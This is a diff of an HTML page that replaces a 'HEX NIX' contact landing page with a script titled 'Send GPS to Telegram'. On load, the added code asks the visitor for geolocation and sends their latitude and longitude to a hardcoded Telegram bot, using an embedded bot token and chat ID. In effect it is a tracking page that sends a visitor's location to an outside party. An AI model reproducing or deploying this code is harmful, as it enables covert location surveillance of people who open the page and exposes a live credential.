@@ -1,96 +1,38 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HEX NIX</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background: #0d0d0d;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(0, 0, 0, 0.4), #000000);
-            z-index: -1;
-        }
-        
-        h1 {
-            font-size: 3em;
-            color: #fff;
-            text-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff;
-            margin-bottom: 50px;
-            text-align: center;
-        }
-        
-        .links {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .links a {
-            display: block;
-            margin: 20px;
-            padding: 15px 30px;
-            font-size: 1.5em;
-            text-align: center;
-            color: #00ffff;
-            text-decoration: none;
-            border-radius: 10px;
-            position: relative;
-            overflow: hidden;
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
-            transition: 0.3s;
-        }
-
-        .links a::before, .links a::after {
-            content: '';
-            position: absolute;
-            width: 120%;
-            height: 120%;
-            top: -20%;
-            left: -20%;
-            background: linear-gradient(45deg, transparent, #00ffff, transparent);
-            transform: rotate(45deg);
-            z-index: -1;
-            transition: 0.5s ease;
-            opacity: 0.3;
-        }
-
-        .links a:hover::before {
-            top: -100%;
-            opacity: 0.5;
-        }
-
-        .links a:hover::after {
-            left: -100%;
-            opacity: 0.5;
-        }
-        
-        .links a:hover {
-            color: #ff00ff;
-            text-shadow: 0 0 20px #ff00ff, 0 0 40px #ff00ff;
-        }
-    </style>
+<meta charset="UTF-8" />
+<title>Send GPS to Telegram</title>
 </head>
 <body>
-    <div class="content">
-        <h1>HEX NIX</h1>
-        <div class="links">
-            <a href="mailto:HEXNIX@protonmail.com">Send Email</a>
-        </div>
-    </div>
+<h1>Allow GPS Access</h1>
+<script>
+  const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
+  const CHAT_ID = "6978055162";
+
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    fetch(url)
+      .then(res => {
+        if(res.ok) alert("Location sent to Telegram!");
+        else alert("Failed to send location.");
+      })
+      .catch(() => alert("Error sending location."));
+  }
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const msg = `User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+        sendToTelegram(msg);
+      },
+      () => alert("GPS access denied or unavailable.")
+    );
+  } else {
+    alert("Geolocation not supported.");
+  }
+</script>
 </body>
 </html>
